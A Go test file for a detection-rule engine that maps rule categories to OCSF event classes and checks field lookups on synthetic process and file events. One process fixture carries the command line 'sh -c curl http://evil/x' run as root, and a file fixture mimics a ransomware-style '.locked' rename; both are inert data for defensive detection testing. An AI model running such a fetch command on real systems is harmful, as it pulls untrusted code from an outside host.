package ruleeval

import (
	"testing"
	"time"

	"github.com/t3rmit3/slither/pkg/ocsf"
	"github.com/t3rmit3/slither/pkg/ruleast"
)

func TestCategoryToClassCoversPhase1(t *testing.T) {
	cases := map[ruleast.Category]ocsf.ClassID{
		ruleast.CategoryProcessCreation:   ocsf.ClassProcessActivity,
		ruleast.CategoryFileEvent:         ocsf.ClassFileSystemActivity,
		ruleast.CategoryNetworkConnection: ocsf.ClassNetworkActivity,
	}
	for cat, want := range cases {
		got, ok := CategoryToClass(cat)
		if !ok || got != want {
			t.Errorf("CategoryToClass(%q) = (%d, %v) want (%d, true)", cat, got, ok, want)
		}
	}
}

func TestEnvLookupOnProcessActivity(t *testing.T) {
	ts := time.Now().UnixMilli()
	ev := &ocsf.ProcessActivity{
		Metadata:   ocsf.Metadata{Version: ocsf.Version, OriginalT: ts, UID: "ev-1"},
		ClassUID:   ocsf.ClassProcessActivity,
		ClassName:  ocsf.ClassProcessActivity.String(),
		ActivityID: ocsf.ProcessActivityLaunch,
		Severity:   ocsf.SeverityInformational,
		Time:       ocsf.TimeOCSF(ts),
		Process: ocsf.Process{
			PID:     1234,
			Name:    "sh",
			Cmdline: "sh -c curl http://evil/x",
			File:    &ocsf.File{Path: "/bin/sh"},
			User:    &ocsf.User{Name: "root", UID: "0"},
		},
	}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryProcessCreation))
	for _, field := range []string{"Image", "CommandLine", "User", "ProcessId"} {
		v, ok := env.Lookup(field)
		if !ok || len(v) == 0 {
			t.Errorf("Lookup(%q) miss, want hit", field)
		}
	}
	if _, ok := env.Lookup("NotAField"); ok {
		t.Errorf("Lookup of unknown field should miss")
	}
}

func TestEnvLookupRenameDestinationOnFileEvent(t *testing.T) {
	ts := time.Now().UnixMilli()
	ev := &ocsf.FileSystemActivity{
		Metadata:   ocsf.Metadata{Version: ocsf.Version, OriginalT: ts, UID: "ev-r"},
		ClassUID:   ocsf.ClassFileSystemActivity,
		ClassName:  ocsf.ClassFileSystemActivity.String(),
		ActivityID: ocsf.FileActivityRename,
		Severity:   ocsf.SeverityInformational,
		Time:       ocsf.TimeOCSF(ts),
		File:       ocsf.File{Path: "/home/alice/report.docx", Name: "report.docx"},
		RenameTo:   &ocsf.File{Path: "/home/alice/report.docx.locked", Name: "report.docx.locked"},
	}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryFileEvent))

	// The source path remains on TargetFilename; the .locked suffix is
	// only reachable through RenameTo / NewFilename.
	if v, ok := env.Lookup("TargetFilename"); !ok || len(v) == 0 || v[0] != "/home/alice/report.docx" {
		t.Errorf("TargetFilename = %v (ok=%v), want the source path", v, ok)
	}
	for _, field := range []string{"RenameTo", "NewFilename"} {
		v, ok := env.Lookup(field)
		if !ok || len(v) == 0 || v[0] != "/home/alice/report.docx.locked" {
			t.Errorf("Lookup(%q) = %v (ok=%v), want the rename destination", field, v, ok)
		}
	}

	// A non-rename event carries no RenameTo, so the field must miss.
	noRename := &ocsf.FileSystemActivity{
		ClassUID:   ocsf.ClassFileSystemActivity,
		ActivityID: ocsf.FileActivityCreate,
		File:       ocsf.File{Path: "/tmp/x", Name: "x"},
	}
	if _, ok := EnvFor(noRename, AccessorFor(ruleast.CategoryFileEvent)).Lookup("RenameTo"); ok {
		t.Errorf("RenameTo on a non-rename event should miss")
	}
}
